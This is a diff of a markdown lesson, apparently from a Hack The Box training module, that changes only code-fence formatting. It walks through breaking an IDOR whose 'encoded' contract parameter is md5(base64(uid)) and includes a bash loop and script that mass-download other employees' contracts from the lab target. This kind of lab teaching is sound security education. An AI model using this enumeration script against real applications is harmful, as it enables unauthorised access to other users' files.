@@ -16,8 +16,7 @@ If we click on the `Employment_contract.pdf` file, it starts downloading the fil
 
 We see that it is sending a `POST` request to `download.php` with the following data:
 
-```
-        php
+```php
 contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
 ```
 
@@ -25,8 +24,7 @@ Using a `download.php` script to download files is a common practice to avoid di
 
 We can attempt to hash various values, like `uid`, `username`, `filename`, and many others, and see if any of their `md5` hashes match the above value. If we find a match, then we can replicate it for other users and collect their files. For example, let's try to compare the `md5` hash of our `uid`, and see if it matches the above hash:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ echo -n 1 | md5sum
 
 c4ca4238a0b923820dcc509a6f75849b -
@@ -42,8 +40,7 @@ As most modern web applications are developed using JavaScript frameworks, like 
 
 If we take a look at the link in the source code, we see that it is calling a JavaScript function with `javascript:downloadContract('1')`. Looking at the `downloadContract()` function in the source code, we see the following:
 
-```
-        javascript
+```javascript
 function downloadContract(uid) {
     $.redirect("/download.php", {
         contract: CryptoJS.MD5(btoa(uid)).toString(),
@@ -57,8 +54,7 @@ In this case, the value being hashed is `btoa(uid)`, which is the `base64` encod
 
 We can test this by `base64` encoding our `uid=1`, and then hashing it with `md5`, as follows:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ echo -n 1 | base64 -w 0 | md5sum
 
 cdd96d3cc73d1dbdaffa03cc6cd7339b -
@@ -76,8 +72,7 @@ Once again, let us write a simple bash script to retrieve all employee contracts
 
 We can start by calculating the hash for each of the first ten employees using the same previous command while using `tr -d` to remove the trailing `-`  characters, as follows:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
 
 cdd96d3cc73d1dbdaffa03cc6cd7339b
@@ -94,8 +89,7 @@ d477819d240e7d3dd9499ed8d23e7158
 
 Next, we can make a `POST` request on `download.php` with each of the above hashes as the `contract` value, which should give us our final script:
 
-```
-        bash
+```bash
 #!/bin/bash
 
 for i in {1..10}; do
@@ -107,8 +101,7 @@ done
 
 With that, we can run the script, and it should download all contracts for employees 1-10:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ bash ./exploit.sh
 hiimeins@htb[/htb]$ ls -1
 
